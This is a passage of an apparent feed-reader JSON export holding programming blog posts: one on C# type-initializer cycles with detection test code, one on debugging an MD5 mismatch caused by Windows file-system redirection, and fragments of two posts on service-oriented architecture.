and commit its transaction without concerning itself with the success or failure of the receiving service.<br /><br />Moreover, queued transports will cache the outbound message locally making the availability of the receiver irrelevant in committing the local transaction.  Without this mechanism for storing messages as they are transported between services, the successful transport of the message as well as the successful execution of the operation at the receiver become relevant as to whether the local transaction can be committed at the sender.<br /><br />Consequently, the sender must<i>wait</i>for a response from the receiver before committing the transaction - during which time local resources will likely be locked as part of the local transaction.<br /><br />So although transactional services are an incredibly powerful tool in service design, they do unfortunately require the use of a queued transport.<img src=\"http://feeds.feedburner.com/~r/BillPoolesCreativeAbrasion/~4/Isfq9MlkoVg\" height=\"1\" width=\"1\"/>","author":"Bill","_id":{"$wrap":"$oid","v":1304}}
{"k":"0000000084","o":"0000025652","v":"001"}
{"_id":1305,"_uid":1305,"_dt":1373742620985,"_s":"edb4200bba8b38b0bff242361e5d6461"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/aF_dVyhKyCg/type-initializer-circular-dependencies.aspx","title":"Type initializer circular dependencies","published":{"$wrap":"$date","v":1333791345000,"h":"2012-04-07T09:35:45.000Z"},"starred":false,"read":false,"content":"<p>To some readers, the title of this post may induce nightmarish recollections of late-night debugging sessions. To others it may be simply the epitome of jargon. Just to break the jargon down a bit:</p><ul><li>Type initializer: the code executed to initialize the static variables of a class, and the static constructor</li><li>Circular dependency: two bits of code which depend on each other - in this case, two classes whose type initializers each require that the other class is initialized</li></ul><p>A quick example of the kind of problem I'm talking about would be helpful here. What would you expect this code to print?</p><div class=\"code\"><span class=\"Namespace\">using</span>System;<br /><br /><span class=\"ReferenceType\">class</span>Test<br />{    <br />   <span class=\"Modifier\">static</span> <span class=\"ValueType\">void</span>Main()<br />    {<br />        Console.WriteLine(First.Beta);<br />    }<br />}<br /><br /><span class=\"ReferenceType\">class</span>First<br />{<br />   <span class=\"Modifier\">public</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span> <span class=\"ValueType\">int</span>Alpha = 5;<br />   <span class=\"Modifier\">public</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span> <span class=\"ValueType\">int</span>Beta = Second.Gamma;<br />}<br /><br /><span class=\"ReferenceType\">class</span>Second<br />{<br />   <span class=\"Modifier\">public</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span> <span class=\"ValueType\">int</span>Gamma = First.Alpha;<br />}</div><p>Of course, without even glancing at the specification, any expectations are pretty irrelevant. Here's what the spec (section 10.5.5.1 of the C# 4 version):</p><blockquote><p>The static field variable initializers of a class correspond to a sequence of assignments that are executed in the textual order in which they appear in the class declaration. If a static constructor (§10.12) exists in the class, execution of the static field initializers occurs immediately prior to executing that static constructor. Otherwise, the static field initializers are executed at an implementation-dependent time prior to the first use of a static field of that class.</p></blockquote><p>In addition to the language specification, the CLI specification gives more details about type initialization in the face of circular dependencies and multiple threads. I won't post the details here, but the gist of it is:</p><ul><li>Type initialization acts like a lock, to prevent more than one thread from initializing a type</li><li>If the CLI notices that type A needs to be initialized in order to make progress, but it's<em>already in the process</em>of initializing type A<em>in the same thread</em>, it continues as if the type were already initialized.</li></ul><p>So here's what you<em>might</em>expect to happen:</p><ol><li>Initialize Test: no further action required</li><li>Start running Main</li><li>Start initializing First (as we need First.Beta)</li><li>Set First.Alpha to 5</li><li>Start initializing Second (as we need Second.Gamma)</li><li>Set Second.Gamma to First.Alpha (5)</li><li>End initializing Second</li><li>Set First.Beta to Second.Gamma (5)</li><li>End initializing First</li><li>Print 5</li></ol><p>Here's what<em>actually</em>happens - on my box, running .NET 4.5 beta. (I know that<a href=\"https://msmvps.com/blogs/jon_skeet/archive/2010/01/26/type-initialization-changes-in-net-4-0.aspx\">type initialization changed for .NET 4</a>, for example. I don't<em>know</em>of any changes for .NET 4.5, but I'm not going to claim it's impossible.)</p><ol><li>Initialize Test: no further action required</li><li>Start running Main</li><li>Start initializing First (as we need First.Beta)</li><li>Start initializing Second (we<em>will</em>need Second.Gamma)</li><li>Set Second.Gamma to First.Alpha (0)</li><li>End initializing Second</li><li>Set First.Alpha to 5</li><li>Set First.Beta to Second.Gamma (0)</li><li>End initializing First</li><li>Print 0</li></ol><p>Step 5 is the interesting one here. We know that we need First to be initialized, in order to get First.Alpha, but this thread is<em>already</em>initializing First (we started in step 3) so we just access First.Alpha and hope that it's got the right value. As it happens, that variable initializer hasn't been executed yet. Oops.</p><p>(One subtlety here is that I<em>could</em>have declared all these variables as constants instead using\"const\" which would have avoided all these problems.)</p><h1>Back in the real world...</h1><p>Hopefully that example makes it clear why circular dependencies in type initializers are nasty. They're hard to spot, hard to debug, and hard to test. Pretty much your classic<a href=\"http://en.wikipedia.org/wiki/Heisenbug\">Heisenbug</a>, really. It's important to note that if the program above had<em>happened</em>to initialize Second first (to access a different variable, for example) we could have ended up with a different result. In particular, it's easy to get into a situation where running<em>all</em>your unit tests can cause a failure - but if you run<em>just</em>the failing test, it passes.</p><p>One way of avoiding all of this is never to use any type initializers for anything, of course. In many cases that's exactly the right solution - but often there<em>are</em>natural uses, particularly for well-known values such as<a href=\"http://msdn.microsoft.com/en-us/library/system.text.encoding.utf8.aspx\">Encoding.Utf8</a>,<a href=\"http://msdn.microsoft.com/en-us/library/system.timezoneinfo.utc.aspx\">TimeZoneInfo.Utc</a>and the like. Note that in both of those cases they are static<em>properties</em>, but I would expect them to be backed by static fields. I'm somewhat ambivalent between using public static readonly fields and public static get-only properties - but as we'll see later, there's a definite advantage to using properties.</p><p><a href=\"http://noda-time.googlecode.com\">Noda Time</a>has quite a few values like this - partly because so many of its types are immutable. It makes sense to create a single UTC time zone, a single ISO calendar system, a single\"pattern\" (text formatter/parser) for each of a variety of common cases. In addition to the publicly visible values, there are various static variables used internally, mostly for caching purposes. All of this definitely adds complexity -<em>and</em>makes it harder to test - but the performance benefits can be significant.</p><p>Unfortunately, a lot of these values end up with fairly natural circular dependencies - as I discovered just recently, where adding a new static field caused all kinds of breakage. I was able to fix the immediate cause, but it left me concerned about the integrity of the code. I'd fixed the one failure I knew about - but what about any others?</p><h1>Testing type initialization</h1><p>One of the biggest issues with type initialization is the order-sensitivity - combined with the way that once a type has been initialized once, that's it for that AppDomain. As I showed earlier, it's possible that initializing types in one particular order causes a problem, but a different order won't.</p><p>I've decided that for Noda Time at least, I want to be reasonably sure that type initialization circularity isn't going to bite me. So I want to validate that no type initializers form cycles, whatever order the types are initialized in. Logically if we can detect a cycle starting with one type, we<em>ought</em>to be able to detect it starting with any of the other types in that cycle - but I'm sufficiently concerned about weird corner cases that I'd rather just take a brute force approach.</p><p>So, as a rough plan:</p><ul><li>Start with an empty set of dependencies</li><li>For each type in the target assembly:<ul><li>Create a new AppDomain</li><li>Load the target assembly into it</li><li>Force the type to be initialized</li><li>Take a stack trace at the start of each type initializer and record any dependencies</li></ul></li><li>Look for cycles in the complete set of dependencies</li></ul><p>Note that we'll never spot a cycle within any single AppDomain, due to the way that type initialization works. We have to put together the results for multiple initialization sequences to try to find a cycle.</p><p>A description of the code would probably be harder to follow than the code itself, but the code is relatively long - I've included it at the end of this post to avoid intefering with the narrative flow. For more up-to-date versions in the future, look at the<a href=\"http://code.google.com/p/noda-time/source/browse/\">Noda Time repository</a>.</p><p>This<em>isn't</em>a terribly nice solution, for various reasons:</p><ul><li>Creating a new AppDomain and loading assemblies into it<em>from a unit test runner</em>isn't as simple as it might be. My code doesn't currently work with NCrunch; I don't know how it finds its assemblies yet. When I've fixed that, I'm sure other test runners would still be broken. Likewise I've had to explicitly filter types to get TeamCity (the continuous integration system Noda Time uses) to work properly. Currently, you'd need to edit the test code to change the filters. (It's possible that there are better ways of filtering, of course.)</li><li>It relies on each type within the production code which has an\"interesting\" type initializer to have a line like this:<div class=\"code\"><span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span> <span class=\"ValueType\">int</span>TypeInitializationChecking = NodaTime.Utility.TypeInitializationChecker.RecordInitializationStart();</div></li><li>Not only does the previous line need to be added to the production code - it clearly gets executed each time, and takes up heap space per type. It's only 4 bytes for each type involved, and it does no real work when we're not testing, but it's a nuisance anyway. I<em>could</em>use preprocessor directives to remove the code from non-debug or non-test-targeted builds, but that would look even messier.</li><li>It only picks up cycles which occur when running the version of .NET the tests happen to execute on. Given that there are ordering changes for different versions, I wouldn't like to claim this is 100% bullet-proof. Likewise if there are only cycles when you're running in some specific cultures (or other environmental features), it won't necessarily pick those up.</li><li>I've deliberately not tried to make the testing code thread-safe. That's fine in Noda Time - I don't have any asynchronous operations or new threads in Noda Time at all - but other code may need to make this more robust.</li></ul><p>So with all these caveats, is it still worth it? Absolutely:<strong>it's already found bugs which have now been fixed</strong>.</p><p>In fact, the test didn't get as far as reporting cycles to start with - it turned out that if you initialized one particular type first, the type initializer would fail with a NullReferenceException. Ouch! Once I'd fixed that, there were still quite a few problems to fix. Somewhat coincidentally, fixing them improved the design too - although the user-visible API didn't change at all.</p><h1>Fixing type initializer cycles</h1><p>In the past, I've occasionally\"fixed\" type initialization ordering problems by simply moving fields around. The cycles still existed, but I figured out how to make them harmless. I can say now that<em>this approach does not scale, and is more effort than it's worth</em>. The code ends up being brittle, hard to think about, and once you've got more than a couple of types involved it's really error-prone, at least for my brain. It's much better to break the cycle completely. To this end, I've ended up using a fairly simple technique to defer initialization of static variables. It's a poor-man's<a href=\"http://msdn.microsoft.com/en-us/library/dd642331.aspx\">Lazy&lt;T&gt;</a>, to some extent - but I'd rather not have to write Lazy&lt;T&gt; myself, and we're currently targeting .NET 3.5...</p><p>Basically, instead of exposing a public static readonly field which creates the cycle, you expose a public static readonly property - which returns an internal static readonly field<em>in a nested, private static class</em>. We still get the nice thread-safe once-only initialization of a type initializer, but the nested type won't be initialized until it needs to be. (In theory it<em>could</em>be initialized earlier, but a static constructor would ensure it isn't.) So long as nothing within the<em>rest</em>of the type initializer for the containing class uses that property, we avoid the cycle.</p><p>So instead of this:</p><div class=\"code\"><span class=\"InlineComment\">// Requires Bar to be initialized - if Bar also requires Foo to be</span><br /><span class=\"InlineComment\">// initialized, we have a problem...</span><br /><span class=\"Modifier\">public</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span>Foo SimpleFoo =<span class=\"Keyword\">new</span>Foo(Bar.Zero);</div><p>We might have:</p><div class=\"code\"><span class=\"Modifier\">public</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span>Foo SimpleFoo { get {<span class=\"Statement\">return</span>Constants.SimpleFoo; } }<br /><br /><span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"ReferenceType\">class</span>Constants<br />{<br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span> <span class=\"ValueType\">int</span>TypeInitializationChecking = NodaTime.Utility.TypeInitializationChecker.RecordInitializationStart(); <br /><br />   <span class=\"InlineComment\">// This requires both Foo and Bar to be initialized, but that's okay</span><br />   <span class=\"InlineComment\">// so long as neither of them require Foo.Constants to be initialized.</span><br />   <span class=\"InlineComment\">// (The unit test would spot that.)</span><br />   <span class=\"Modifier\">internal</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span>Foo SimpleFoo =<span class=\"Keyword\">new</span>Foo(Bar.Zero);<br />}</div><p>I'm currently undecided about whether to include static constructors in these classes to ensure lazy initialization. If the type initializer for Foo triggered the initializer of Foo.Constants, we'd be back to square one... but adding static constructors into each of these nested classes sounds like a bit of a pain. The nested classes should call into the type initialization checking as well, to validate they don't cause any problems themselves.</p><h1>Conclusion</h1><p>I have to say, part of me really doesn't like either the testing code or the workaround. Both smack of being<em>clever</em>, which is never a good thing. It's definitely worth considering whether you could actually just get rid of the type initializer (or part of it) entirely, avoiding maintaining so much static state. It would be nice to be able to detect these type initializer cycles without running anything, simply using static analysis - I'm going to see whether NDepend could do that when I get a chance. The workaround doesn't feel as neat as Lazy&lt;T&gt;, which is<em>really</em>what's called for here - but I don't trust myself to implement it correctly and efficiently myself.</p><p>So while both are somewhat hacky, they're better than the alternative: buggy code. That's what I'm ashamed to say I had in Noda Time, and I don't think I'd<em>ever</em>have spotted all the cycles by inspection. It's worth a try on your own code - see whether you've got problems lurking...</p><p> </p><p> </p><h1>Appendix: Testing code</h1><p>As promised earlier, here's the code for the production and test classes.</p><h2>TypeInitializationChecker</h2><p>This is in NodaTime.dll itself.</p><div class=\"code\"><span class=\"Modifier\">internal</span> <span class=\"Modifier\">sealed</span> <span class=\"ReferenceType\">class</span>TypeInitializationChecker : MarshalByRefObject<br />{<br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span>List&lt;Dependency&gt; dependencies =<span class=\"Keyword\">null</span>;<br /><br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"Modifier\">readonly</span>MethodInfo EntryMethod =<span class=\"Keyword\">typeof</span>(TypeInitializationChecker).GetMethod(<span class=\"String\">\"FindDependencies\"</span>);<br /><br />   <span class=\"Modifier\">internal</span> <span class=\"Modifier\">static</span> <span class=\"ValueType\">int</span>RecordInitializationStart()<br />    {<br />       <span class=\"Statement\">if</span>(dependencies ==<span class=\"Keyword\">null</span>)<br />        {<br />           <span class=\"Statement\">return</span>0;<br />        }<br />        Type previousType =<span class=\"Keyword\">null</span>;<br />       <span class=\"Statement\">foreach</span>(<span class=\"Linq\">var</span>frame<span class=\"Statement\">in</span> <span class=\"Keyword\">new</span>StackTrace().GetFrames())<br />        {<br />           <span class=\"Linq\">var</span>method = frame.GetMethod();<br />           <span class=\"Statement\">if</span>(method == EntryMethod)<br />            {<br />               <span class=\"Statement\">break</span>;<br />            }<br />           <span class=\"Linq\">var</span>declaringType = method.DeclaringType;<br />           <span class=\"Statement\">if</span>(method == declaringType.TypeInitializer)<br />            {<br />               <span class=\"Statement\">if</span>(previousType !=<span class=\"Keyword\">null</span>)<br />                {<br />                    dependencies.Add(<span class=\"Keyword\">new</span>Dependency(declaringType, previousType));<br />                }<br />                previousType = declaringType;<br />            }<br />        }<br />       <span class=\"Statement\">return</span>0;<br />    }<br /><br />   <span class=\"XmlComment\">///&lt;summary&gt;</span><br />   <span class=\"XmlComment\">/// Invoked from the unit tests, this finds the dependency chain for a single type</span><br />   <span class=\"XmlComment\">/// by invoking its type initializer.</span><br />   <span class=\"XmlComment\">///&lt;/summary&gt;</span><br />   <span class=\"Modifier\">public</span>Dependency[] FindDependencies(<span class=\"ReferenceType\">string</span>name)<br />    {<br />        dependencies =<span class=\"Keyword\">new</span>List&lt;Dependency&gt;();<br />        Type type =<span class=\"Keyword\">typeof</span>(TypeInitializationChecker).Assembly.GetType(name,<span class=\"Keyword\">true</span>);<br />        RuntimeHelpers.RunClassConstructor(type.TypeHandle);<br />       <span class=\"Statement\">return</span>dependencies.ToArray();<br />    }<br /><br />   <span class=\"XmlComment\">///&lt;summary&gt;</span><br />   <span class=\"XmlComment\">/// A simple from/to tuple, which can be marshaled across AppDomains.</span><br />   <span class=\"XmlComment\">///&lt;/summary&gt;</span><br />   <span class=\"Modifier\">internal</span> <span class=\"Modifier\">sealed</span> <span class=\"ReferenceType\">class</span>Dependency : MarshalByRefObject<br />    {<br />       <span class=\"Modifier\">public</span> <span class=\"ReferenceType\">string</span>From { get;<span class=\"Modifier\">private</span>set; }<br />       <span class=\"Modifier\">public</span> <span class=\"ReferenceType\">string</span>To { get;<span class=\"Modifier\">private</span>set; }<br />       <span class=\"Modifier\">internal</span>Dependency(Type<span class=\"Linq\">from</span>, Type to)<br />        {<br />            From =<span class=\"Linq\">from</span>.FullName;<br />            To = to.FullName;<br />        }<br />    }<br />}</div><h2>TypeInitializationTest</h2><p>This is within NodaTime.Test:</p><div class=\"code\">[TestFixture]<br /><span class=\"Modifier\">public</span> <span class=\"ReferenceType\">class</span>TypeInitializationTest<br />{<br />    [Test]<br />   <span class=\"Modifier\">public</span> <span class=\"ValueType\">void</span>BuildInitializerLoops()<br />    {<br />        Assembly assembly =<span class=\"Keyword\">typeof</span>(TypeInitializationChecker).Assembly;<br />       <span class=\"Linq\">var</span>dependencies =<span class=\"Keyword\">new</span>List&lt;TypeInitializationChecker.Dependency&gt;();<br />       <span class=\"InlineComment\">// Test each type in a new AppDomain - we want to see what happens where each type is initialized first.</span><br />       <span class=\"InlineComment\">// Note: Namespace prefix check is present to get this to survive in test runners which</span><br />       <span class=\"InlineComment\">// inject extra types. (Seen with JetBrains.Profiler.Core.Instrumentation.DataOnStack.)</span><br />       <span class=\"Statement\">foreach</span>(<span class=\"Linq\">var</span>type<span class=\"Statement\">in</span>assembly.GetTypes().Where(t =&gt; t.FullName.StartsWith(<span class=\"String\">\"NodaTime\"</span>)))<br />        {<br />           <span class=\"InlineComment\">// Note: this won't be enough to load the assembly in all test runners. In particular, it fails in</span><br />           <span class=\"InlineComment\">// NCrunch at the moment.</span><br />            AppDomainSetup setup =<span class=\"Keyword\">new</span>AppDomainSetup { ApplicationBase = AppDomain.CurrentDomain.BaseDirectory };<br />            AppDomain domain = AppDomain.CreateDomain(<span class=\"String\">\"InitializationTest\"</span>+ type.Name, AppDomain.CurrentDomain.Evidence, setup);<br />           <span class=\"Linq\">var</span>helper = (TypeInitializationChecker)domain.CreateInstanceAndUnwrap(assembly.FullName,<br />               <span class=\"Keyword\">typeof</span>(TypeInitializationChecker).FullName);<br />            dependencies.AddRange(helper.FindDependencies(type.FullName));<br />        }<br />       <span class=\"Linq\">var</span>lookup = dependencies.ToLookup(d =&gt; d.From, d =&gt; d.To);<br />       <span class=\"InlineComment\">// This is less efficient than it might be, but I'm aiming for simplicity: starting at each type</span><br />       <span class=\"InlineComment\">// which has a dependency, can we make a cycle?</span><br />       <span class=\"InlineComment\">// See Tarjan's Algorithm in Wikipedia for ways this could be made more efficient.</span><br />       <span class=\"InlineComment\">// http://en.wikipedia.org/wiki/Tarjan's_strongly_connected_components_algorithm</span><br />       <span class=\"Statement\">foreach</span>(<span class=\"Linq\">var</span> <span class=\"Linq\">group</span> <span class=\"Statement\">in</span>lookup)<br />        {<br />            Stack&lt;<span class=\"ReferenceType\">string</span>&gt; path =<span class=\"Keyword\">new</span>Stack&lt;<span class=\"ReferenceType\">string</span>&gt;();<br />            CheckForCycles(<span class=\"Linq\">group</span>.Key, path, lookup);<br />        }<br />    }<br /><br />   <span class=\"Modifier\">private</span> <span class=\"Modifier\">static</span> <span class=\"ValueType\">void</span>CheckForCycles(<span class=\"ReferenceType\">string</span>next, Stack&lt;<span class=\"ReferenceType\">string</span>&gt; path, ILookup&lt;<span class=\"ReferenceType\">string</span>,<span class=\"ReferenceType\">string</span>&gt; dependencyLookup)<br />    {<br />       <span class=\"Statement\">if</span>(path.Contains(next))<br />        {<br />            Assert.Fail(<span class=\"String\">\"Type initializer cycle: {0}-{1}\"</span>,<span class=\"ReferenceType\">string</span>.Join(<span class=\"String\">\"-\"</span>, path.Reverse().ToArray()), next);<br />        }<br />        path.Push(next);<br />       <span class=\"Statement\">foreach</span>(<span class=\"Linq\">var</span>candidate<span class=\"Statement\">in</span>dependencyLookup[next].Distinct())<br />        {<br />            CheckForCycles(candidate, path, dependencyLookup);<br />        }<br />        path.Pop();<br />    }<br />}</div><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1808561\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/aF_dVyhKyCg\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1305}}
{"k":"0000000084","o":"0000011541","v":"001"}
{"_id":1306,"_uid":1306,"_dt":1373742620986,"_s":"7268e66ae505382fb62b528353eab8ce"}
{"subscription":{"$wrap":"$oid","v":50},"link":"http://feedproxy.google.com/~r/JonSkeetCodingBlog/~3/CIaupaq9SkE/diagnosing-weird-problems-a-stack-overflow-case-study.aspx","title":"Diagnosing weird problems - a Stack Overflow case study","published":{"$wrap":"$date","v":1331879460000,"h":"2012-03-16T06:31:00.000Z"},"starred":false,"read":false,"content":"<p>Earlier, I came across<a href=\"http://stackoverflow.com/questions/9728056\">this Stack Overflow question</a>. I solved it, tweeted it, but then thought it would serve as a useful case study into the mental processes I go through when trying to solve a problem - whether that's on Stack Overflow, at work, or at home.</p><p>It's definitely worth reading the original question, but the executive summary is:</p><blockquote><p>When I compute the checksum/hash of c:\\Windows\\System32\\Calc.exe using various tools and algorithms, those tools all give the same answer for each algorithm. When I try doing the same thing in Java, I get different results. What's going on?</p></blockquote><p>Now to start with, I'd like to shower a bit of praise on the author:</p><ul><li>The post came with a short but utterly complete program to demonstrate the problem</li><li>The comments in the program showed the expected values and the actual values</li><li>The code was mostly pretty clean (clean enough for an SO post anyway)</li></ul><p>In short, it had pretty much<a href=\"http://tinyurl.com/so-hints\">everything I ask for in a question</a>. Yay! Additionally, the result seemed to be strange. The chances of any one of Java's hashing algorithms being broken seem pretty slim, but<em>four</em>of them? Okay, now you've got me interested.</p><h3>Reproducing the problem</h3><p>Unless I can spot the error immediately, I usually try to reproduce the problem in a Stack Overflow post with a short but complete program. In this case, the program was already provided, so it was just a matter of copy/paste/compile/run. This one had the additional tweak that it was comparing the results of Java with the results of other tools, so I had to get hold of an MD5 sum tool first. (I chose to start with MD5 for no particular reason.) I happened to pick<a href=\"http://www.pc-tools.net/win32/md5sums/\">this one</a>, but it didn't really seem it would make much difference. (As it happens, that was an incorrect assumption, but hey...)</p><p>I ran md5sums on c:\\Windows\\System32\\calc.exe, and got the same result as the poster. Handy.</p><p>I then ran the Java code, and again got the same result as the poster: step complete, we have a discrepancy between at least one tool (and MD5 isn't that hard to get right) and Java.</p><p><strong>Looking for obvious problems</strong></p><p>The code has four main areas:</p><ul><li>Reading a file</li><li>Updating digests</li><li>Converting bytes to hex</li><li>Storing and displaying results</li></ul><p>Of these, all of the first three have common and fairly simple error modes. For example:</p><ul><li>Failure to use the return value from InputStream.read()</li><li>Failure to update the digests using only the relevant portion of the data buffer</li><li>Failure to cope with Java's signed bytes</li></ul><p>The code for storing and displaying results seemed solid enough to ignore to start with, and brief inspection suggested that the first two failure modes had been avoided. While the hex code didn't have any<em>obvious</em>problems either, it made sense to check it. I simply printed the result of hard-coding the\"known good\" CRC-32 value:</p><div class=\"code\">System.out.println(toHex(<span class=\"Keyword\">new</span> <span class=\"Type\">byte</span>[] {<br />    (<span class=\"Type\">byte</span>) 0x8D, (<span class=\"Type\">byte</span>) 0x8F, (<span class=\"Type\">byte</span>) 0x5F, (<span class=\"Type\">byte</span>) 0x8E<br />  }));</div><p>That produced the right result, so I ruled out that part of the code too. Even if it had errors in some cases, we know it's capable of producing the right string for one of the values we know we<em>should</em>be returning, so it can't be getting that value.</p><h3>Initial checks around the file</h3><p>I'm always suspicious of stream-handling code - or rather, I know how easily it can hide subtle bugs. Even though it<em>looked</em>okay, I thought I'd check - so I added a simple total to the code so I could see how many bytes had been hashed. I also removed all the hash algorithms other than MD5, just for simplicity:</p><div class=\"code\">MessageDigest md5 = MessageDigest.getInstance(<span class=\"String\">\"MD5\"</span>);<br /><br />FileInputStream fis =<span class=\"Keyword\">new</span>FileInputStream(file);<br /><span class=\"Type\">byte</span>data[] =<span class=\"Keyword\">new</span> <span class=\"Type\">byte</span>[size];<br /><span class=\"Type\">int</span>len = 0;<br /><span class=\"Type\">int</span>total = 0;<br /><span class=\"Statement\">while</span>((len = fis.read(data)) != -1) {<br />    md5.update(data, 0, len);<br />    total += len;<br />}<br />fis.close();<br />System.out.println(<span class=\"String\">\"Total bytes read:\"</span>+ total);<br /><br />results.put(md5.getAlgorithm(), toHex(md5.digest()));</div><p>It's worth noting that I<em>haven't</em>tried to fix up bits of the code which I know I would change if I were actually doing a code review:</p><ul><li>The stream isn't being closed in a finally block, so we'll have a dangling resource (until GC) if an IOException is thrown</li><li>The initial value of len is never read, and can be removed</li></ul><p>Neither of these matters in terms of the problem at hand, and closing the file\"properly\" would make the sample code more complicated. (For the sake of just a short sample program, I'd be tempted to remove it entirely.)</p><p>The result showed the number of bytes being read as the command prompt did when I ran\"dir c:\\Windows\\System32\\Calc.exe\" - so again, everything looks like it's okay.</p><h3>Desperate times call for stupid measures</h3><p>Just on a whim, I decided to copy Calc.exe to a local folder (the current directory) and retry. After all, accessing a file in a system folder<em>might</em>have some odd notions applied to it. It's hard to work out what, but... there's nothing to lose just by trying a simple test. If it can rule<em>anything</em>out, and you've got no better ideas, you might as well try even the daftest idea.</p><p>I modified the source code to use the freshly-copied file, and it gave the same result. Hmm.</p><p>I then reran md5sums on the copied file... and it gave<em>the same result as Java</em>. In other words, running\"md5sums c:\\Windows\\System32\\Calc.exe\" gave one result, but\"md5sums CopyOfCalc.exe\" gave a different result. At this point we've moved from<em>Java</em>looking like it's behaving weirdly to<em>md5sums</em>looking suspicious.</p><h3>Proving the root cause</h3><p>At this point we're<em>sort of</em>done - we've basically proved that the Java code produces the right hash for whatever data it's given, but we're left with the question of what's happening on the file system. I had a hunch that it might be something to do with x86 vs x64 code (all of this was running on a 64-bit version of Windows 7) - so how do we test that assumption?</p><p>I don't know if there's a simple way of running an x86 version of the JVM, but I<em>do</em>know how to switch .NET code between x86 and x64 - you can do that for an assembly at build time. C# also makes the hashing and hex conversion simple, so I was able to knock up a very small app to show the problem:</p><div class=\"code\"><span class=\"Namespace\">using</span>System;<br /><span class=\"Namespace\">using</span>System.IO;<br /><span class=\"Namespace\">using</span>System.Security.Cryptography;<br /><br /><span class=\"ReferenceType\">class</span>Test<br />{<br />   <span class=\"Modifier\">static</span> <span class=\"ValueType\">void</span>Main()<br />    {<br />       <span class=\"Namespace\">using</span>(<span class=\"Linq\">var</span>md5 = MD5.Create())<br />        {<br />           <span class=\"ReferenceType\">string</span>path =<span class=\"String\">\"c:/Windows/System32/Calc.exe\"</span>;<br />           <span class=\"Linq\">var</span>bytes = md5.ComputeHash(File.ReadAllBytes(path));<br />            Console.WriteLine(BitConverter.ToString(bytes));<br />        }<br />    }<br />}</div><p>(For a larger file I'd have used File.OpenRead instead, but then I'd have wanted to close the stream afterwards. Somehow it wasn't worth correcting the<em>existing</em>possible handle leak in the Java code, but I didn't want to write leaky code myself. So instead I've got code which reads the whole file into memory unnecessarily...&lt;sigh&gt;)</p><p>You can choose the architecture to build against (usually AnyCPU, x86 or x64 - though it's interesting to see that\"arm\" is also an option under .NET 4.5, for obvious reasons) either from Visual Studio or using the\"/platform\" command line option. This doesn't change the IL emitted (as far as I'm aware) but it's used for interop with native code - and in the case of executables, it also determines the version of the CLR which is used.</p><p>Building and running in x86 mode gave the same answer as the original\"assumed to be good\" tools; building and running in x64 mode gave the same answer as Java.</p><h3>Explaining the root cause</h3><p>At this point we've proved that the file system gives different results depending on whether you access it from a 64-bit process or a 32-bit process. The<em>final</em>piece of the puzzle was to find some something to explain why that happens. With all the evidence about what's happening, it was now easy to search for more information, and I found<a href=\"http://www.samlogic.net/articles/32-64-bit-windows-folder-x86-syswow64.htm\">this article</a>giving satisfactory details. Basically, there are two different copies of the system executables on a 64 bit system: x86 ones which run under the 32-bit emulator, and x64 ones. They're actually in different directories, but when a process opens a file in \\Windows\\System32, the copy which matches the architecture of the process is used. It's almost as if the \\Windows\\System32 directory is a symlink which changes target depending on the current process.</p><p>A Stack Overflow comment on my answer gave a final nugget that this is called the\"File System Redirector\".</p><h3>Conclusion</h3><p>Debugging sessions often feel a bit like this - particularly if you're like me, and only resort to<em>real</em>debugging after unit testing has failed. It's a matter of looking under all kinds of rocks, trying anything and everything, but keeping track of everything you try. At the end of process you should be able to explain<em>every</em>result you've seen, in an ideal world. (You may not be able to give evidence of the actual chain of events, but you should be able to construct a plausible chain of events which concurs with your theory.)</p><p>Be aware of areas which can<em>often</em>lead to problems, and check those first, gradually reducing the scope of\"stuff you don't understand\" to a manageable level, until it disappears completely.</p><div style=\"clear:both;\"></div><img src=\"http://msmvps.com/aggbug.aspx?PostID=1807429\" width=\"1\" height=\"1\"><img src=\"http://feeds.feedburner.com/~r/JonSkeetCodingBlog/~4/CIaupaq9SkE\" height=\"1\" width=\"1\"/>","author":"skeet","_id":{"$wrap":"$oid","v":1306}}
{"k":"0000000084","o":"0000006075","v":"001"}
{"_id":1307,"_uid":1307,"_dt":1373742620986,"_s":"91b30cfb68e7f11ba2b74b35b15b68a6"}
{"subscription":{"$wrap":"$oid","v":47},"link":"http://feedproxy.google.com/~r/BillPoolesCreativeAbrasion/~3/WaVr7-qjpt8/anatomy-of-service-part-ii.html","title":"The Anatomy of a Service (Part II)","published":{"$wrap":"$date","v":1224517740004,"h":"2008-10-20T15:49:00.004Z"},"starred":false,"read":false,"content":"With my<a href=\"http://bill-poole.blogspot.com/2008/10/anatomy-of-service-part-i.html\">last post</a>, we began the journey into the anatomy of a service by restating the definition of a service in the context of SOA.  In this post, we're going to dig a bit deeper into the elements that make up a service.  These elements are illustrated below.<br /><br /><a href=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SPyoyjgJgxI/AAAAAAAAAEU/0svYzvvNtIU/s1600-h/Service+Elements.png\"><img style=\"display:block; margin:0px auto 10px; text-align:center;cursor:pointer; cursor:hand;\" src=\"http://2.bp.blogspot.com/_Ulehi1qz3j0/SPyoyjgJgxI/AAAAAAAAAEU/0svYzvvNtIU/s400/Service+Elements.png\" border=\"0\" alt=\"\"id=\"BLOGGER_PHOTO_ID_5259264051338904338\" /></a><br />Note that the illustration above doesn't imply any kind of layering.  There are three types of service elements depicted.  The yellow elements are related to the service domain.  This is the logic, information model and state that drives the behaviour of the service relative to the responsibilities it holds in the overall architecture.<br /><br />The green elements relate to the service boundary.  The service contract describes the messages managed by the service and the endpoints through which the messages are exchanged.<br /><br />The blue elements are service resources.  Note that the service contains human resources.  This is because service logic may in part be executed by people. 